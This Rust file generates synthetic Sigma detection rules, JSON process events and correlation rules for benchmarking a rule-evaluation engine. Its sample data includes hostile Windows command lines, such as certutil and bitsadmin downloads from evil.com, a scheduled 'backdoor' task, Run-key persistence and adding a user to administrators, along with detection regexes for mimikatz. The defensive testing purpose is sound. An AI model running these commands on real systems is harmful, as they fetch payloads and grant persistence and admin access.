//! Synthetic data generators for rsigma-eval benchmarks.
//!
//! Generates Sigma YAML rules, JSON events, and correlation rule YAML.
//! All generators are seeded for reproducibility.

#![allow(dead_code)]

use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};

/// Fixed seed for reproducible benchmarks.
const SEED: u64 = 0xDEAD_BEEF_CAFE;

/// Create a seeded RNG.
pub fn rng() -> StdRng {
    StdRng::seed_from_u64(SEED)
}

// ---------------------------------------------------------------------------
// Field / value pools
// ---------------------------------------------------------------------------

const FIELD_NAMES: &[&str] = &[
    "CommandLine",
    "ParentCommandLine",
    "Image",
    "ParentImage",
    "TargetFilename",
    "SourceIp",
    "DestinationIp",
    "DestinationPort",
    "User",
    "EventType",
    "ProcessName",
    "RegistryKey",
    "ServiceName",
    "Hashes",
    "QueryName",
    "OriginalFileName",
];

const STRING_VALUES: &[&str] = &[
    "whoami",
    "cmd.exe",
    "powershell.exe",
    "net.exe",
    "mimikatz",
    "lsass.exe",
    "svchost.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "explorer.exe",
    "tasklist.exe",
];

const WILDCARD_PATTERNS: &[&str] = &[
    "*\\\\whoami.exe",
    "C:\\\\Windows\\\\Temp\\\\*",
    "*\\\\cmd.exe /c *",
    "*.ps1",
    "*\\\\powershell*",
    "*\\\\AppData\\\\Local\\\\Temp\\\\*",
    "*mimikatz*",
    "*\\\\System32\\\\*",
    "HKLM\\\\SOFTWARE\\\\*",
    "*-encoded*",
];

const REGEX_PATTERNS: &[&str] = &[
    "(?i)cmd\\.exe.*/c.*whoami",
    "(?i)powershell.*-enc.*[A-Za-z0-9+/=]{40,}",
    "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
    "(?i)\\\\users\\\\[^\\\\]+\\\\appdata",
    "(?i)(invoke-mimikatz|sekurlsa)",
    "[A-Fa-f0-9]{32,64}",
    "(?i)net\\s+(user|localgroup|group)",
    "(?i)(certutil|bitsadmin).*(-urlcache|/transfer)",
];

const PRODUCTS: &[&str] = &["windows", "linux", "macos"];
const CATEGORIES: &[&str] = &[
    "process_creation",
    "file_event",
    "registry_event",
    "network_connection",
    "dns_query",
];
const LEVELS: &[&str] = &["low", "medium", "high", "critical"];

const USER_NAMES: &[&str] = &[
    "admin",
    "root",
    "SYSTEM",
    "alice",
    "bob",
    "carol",
    "dave",
    "eve",
    "svc_account",
    "backup_user",
    "deploy",
    "jenkins",
    "www-data",
];

pub const IMAGE_PATHS: &[&str] = &[
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\whoami.exe",
    "C:\\Windows\\System32\\net.exe",
    "C:\\Windows\\System32\\rundll32.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\Temp\\malware.exe",
    "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe",
    "/usr/bin/bash",
    "/usr/bin/curl",
    "/usr/sbin/useradd",
];

const COMMAND_LINES: &[&str] = &[
    "whoami /all",
    "cmd.exe /c net user admin P@ss123",
    "powershell.exe -enc SGVsbG8gV29ybGQ=",
    "net localgroup administrators admin /add",
    "certutil -urlcache -split -f http://evil.com/payload.exe",
    "bitsadmin /transfer myJob http://evil.com/file C:\\temp\\file",
    "rundll32.exe shell32.dll,ShellExec_RunDLL notepad.exe",
    "schtasks /create /tn backdoor /tr malware.exe",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "wmic process list brief",
    "tasklist /svc",
    "ipconfig /all",
    "systeminfo",
    "nslookup evil.com",
    "ping -n 1 10.0.0.1",
    "notepad.exe readme.txt",
];

// ---------------------------------------------------------------------------
// Rule generators (same logic as parser/benches/gen.rs)
// ---------------------------------------------------------------------------

/// Generate a single realistic Sigma detection rule YAML.
pub fn gen_single_rule(rng: &mut StdRng, id: usize) -> String {
    let product = PRODUCTS[rng.random_range(0..PRODUCTS.len())];
    let category = CATEGORIES[rng.random_range(0..CATEGORIES.len())];
    let level = LEVELS[rng.random_range(0..LEVELS.len())];
    let num_items = rng.random_range(1..=4);

    let mut detection = String::new();
    detection.push_str("    selection:\n");
    for _ in 0..num_items {
        let field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];
        let val = STRING_VALUES[rng.random_range(0..STRING_VALUES.len())];
        let modifier = match rng.random_range(0..5u8) {
            0 => "",
            1 => "|contains",
            2 => "|startswith",
            3 => "|endswith",
            _ => "",
        };
        detection.push_str(&format!("        {field}{modifier}: '{val}'\n"));
    }

    if rng.random_bool(0.3) {
        detection.push_str("    filter:\n");
        let field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];
        let val = STRING_VALUES[rng.random_range(0..STRING_VALUES.len())];
        detection.push_str(&format!("        {field}: '{val}'\n"));
    }

    let condition = if rng.random_bool(0.3) {
        "selection and not filter".to_string()
    } else {
        "selection".to_string()
    };

    format!(
        "title: Bench Rule {id}\n\
         id: bench-rule-{id:06}\n\
         name: bench_rule_{id}\n\
         logsource:\n\
         \x20   product: {product}\n\
         \x20   category: {category}\n\
         detection:\n\
         {detection}\
         \x20   condition: {condition}\n\
         level: {level}\n"
    )
}

/// Generate a single wildcard-heavy rule.
pub fn gen_wildcard_rule(rng: &mut StdRng, id: usize) -> String {
    let num_items = rng.random_range(2..=5);
    let mut detection = String::new();
    detection.push_str("    selection:\n");
    for _ in 0..num_items {
        let field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];
        let pattern = WILDCARD_PATTERNS[rng.random_range(0..WILDCARD_PATTERNS.len())];
        detection.push_str(&format!("        {field}|contains: '{pattern}'\n"));
    }

    format!(
        "title: Wildcard Rule {id}\n\
         id: wildcard-{id:06}\n\
         logsource:\n\
         \x20   product: windows\n\
         \x20   category: process_creation\n\
         detection:\n\
         {detection}\
         \x20   condition: selection\n\
         level: medium\n"
    )
}

/// Generate a single regex-heavy rule.
pub fn gen_regex_rule(rng: &mut StdRng, id: usize) -> String {
    let num_items = rng.random_range(1..=3);
    let mut detection = String::new();
    detection.push_str("    selection:\n");
    for _ in 0..num_items {
        let field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];
        let pattern = REGEX_PATTERNS[rng.random_range(0..REGEX_PATTERNS.len())];
        detection.push_str(&format!("        {field}|re: '{pattern}'\n"));
    }

    format!(
        "title: Regex Rule {id}\n\
         id: regex-{id:06}\n\
         logsource:\n\
         \x20   product: windows\n\
         \x20   category: process_creation\n\
         detection:\n\
         {detection}\
         \x20   condition: selection\n\
         level: medium\n"
    )
}

/// Generate a multi-document YAML string with `n` detection rules.
pub fn gen_n_rules(n: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::with_capacity(n);
    for i in 0..n {
        docs.push(gen_single_rule(&mut rng, i));
    }
    docs.join("---\n")
}

/// Generate `n` wildcard-heavy rules.
pub fn gen_n_wildcard_rules(n: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::with_capacity(n);
    for i in 0..n {
        docs.push(gen_wildcard_rule(&mut rng, i));
    }
    docs.join("---\n")
}

/// Generate `n` regex-heavy rules.
pub fn gen_n_regex_rules(n: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::with_capacity(n);
    for i in 0..n {
        docs.push(gen_regex_rule(&mut rng, i));
    }
    docs.join("---\n")
}

// ---------------------------------------------------------------------------
// Event generators
// ---------------------------------------------------------------------------

/// Generate a single `serde_json::Value` event.
pub fn gen_event_value(rng: &mut StdRng) -> serde_json::Value {
    let user = USER_NAMES[rng.random_range(0..USER_NAMES.len())];
    let image = IMAGE_PATHS[rng.random_range(0..IMAGE_PATHS.len())];
    let cmdline = COMMAND_LINES[rng.random_range(0..COMMAND_LINES.len())];
    let parent = IMAGE_PATHS[rng.random_range(0..IMAGE_PATHS.len())];
    let src_ip = format!(
        "10.{}.{}.{}",
        rng.random_range(0..256u16),
        rng.random_range(0..256u16),
        rng.random_range(1..255u16),
    );
    let dst_port = rng.random_range(1..=65535u16);
    let event_type = match rng.random_range(0..4u8) {
        0 => "login",
        1 => "process_create",
        2 => "file_write",
        _ => "network_connect",
    };
    let original_name = image.rsplit(['\\', '/']).next().unwrap_or(image);

    serde_json::json!({
        "User": user,
        "Image": image,
        "CommandLine": cmdline,
        "ParentImage": parent,
        "SourceIp": src_ip,
        "DestinationPort": dst_port,
        "EventType": event_type,
        "ProcessName": image,
        "OriginalFileName": original_name,
    })
}

/// Generate `n` `serde_json::Value` events.
pub fn gen_event_values(n: usize) -> Vec<serde_json::Value> {
    let mut rng = rng();
    (0..n).map(|_| gen_event_value(&mut rng)).collect()
}

// ---------------------------------------------------------------------------
// Correlation rule generators
// ---------------------------------------------------------------------------

/// Generate `n_detect` detection rules followed by `n_corr` event_count
/// correlation rules that reference them.
pub fn gen_rules_with_event_count_correlations(n_detect: usize, n_corr: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::new();

    // Detection rules
    for i in 0..n_detect {
        docs.push(gen_single_rule(&mut rng, i));
    }

    // Correlation rules (each references a subset of detection rules)
    for c in 0..n_corr {
        let ref_idx = c % n_detect;
        let threshold = rng.random_range(2..=10u64);
        let timespan = rng.random_range(60..=3600u64);
        let group_field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];

        docs.push(format!(
            "title: Corr EventCount {c}\n\
             id: corr-ec-{c:06}\n\
             correlation:\n\
             \x20   type: event_count\n\
             \x20   rules:\n\
             \x20       - bench-rule-{ref_idx:06}\n\
             \x20   group-by:\n\
             \x20       - {group_field}\n\
             \x20   timespan: {timespan}s\n\
             \x20   condition:\n\
             \x20       gte: {threshold}\n\
             level: high\n"
        ));
    }

    docs.join("---\n")
}

/// Generate `n_detect` detection rules followed by `n_corr` temporal
/// correlation rules, each referencing 2–3 detection rules.
pub fn gen_rules_with_temporal_correlations(n_detect: usize, n_corr: usize) -> String {
    let mut rng = rng();
    let mut docs = Vec::new();

    for i in 0..n_detect {
        docs.push(gen_single_rule(&mut rng, i));
    }

    for c in 0..n_corr {
        let ref1 = c % n_detect;
        let ref2 = (c + 1) % n_detect;
        let timespan = rng.random_range(60..=3600u64);
        let group_field = FIELD_NAMES[rng.random_range(0..FIELD_NAMES.len())];

        docs.push(format!(
            "title: Corr Temporal {c}\n\
             id: corr-tmp-{c:06}\n\
             correlation:\n\
             \x20   type: temporal\n\
             \x20   rules:\n\
             \x20       - bench-rule-{ref1:06}\n\
             \x20       - bench-rule-{ref2:06}\n\
             \x20   group-by:\n\
             \x20       - {group_field}\n\
             \x20   timespan: {timespan}s\n\
             level: high\n"
        ));
    }

    docs.join("---\n")
}
